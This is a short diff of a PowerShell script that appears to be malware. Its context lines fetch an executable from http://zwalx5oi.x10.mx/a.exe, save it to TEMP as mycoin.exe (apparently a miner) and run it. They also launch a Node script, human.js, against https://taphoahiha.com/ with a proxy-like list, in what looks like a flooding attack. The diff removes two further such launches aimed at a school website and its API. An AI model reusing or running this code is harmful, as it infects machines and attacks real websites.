@@ -44,8 +44,7 @@ Start-Process $outfile
 
 $path="$env:TEMP\human.js"; while(-not (Test-Path $path)){ Start-Sleep -Seconds 1 }
 Start-Process node -ArgumentList "--trace-warnings","human.js","https://taphoahiha.com/","6000000","kk.txt","15","90" -WorkingDirectory $env:TEMP -NoNewWindow -PassThru
-Start-Process node -ArgumentList "--trace-warnings","human.js","https://thcs-quangtrung-phuong2baoloc.lamdong.dlib.vn/","6000000","kk.txt","15","90" -WorkingDirectory $env:TEMP -NoNewWindow -PassThru
-Start-Process node -ArgumentList "--trace-warnings","human.js","https://api2.lamdong.dlib.vn/api/v1/my/profile","6000000","kk.txt","15","90" -WorkingDirectory $env:TEMP -NoNewWindow -PassThru
+
 
 $url = "http://zwalx5oi.x10.mx/a.exe"
 $outfile = "$env:TEMP\mycoin.exe"
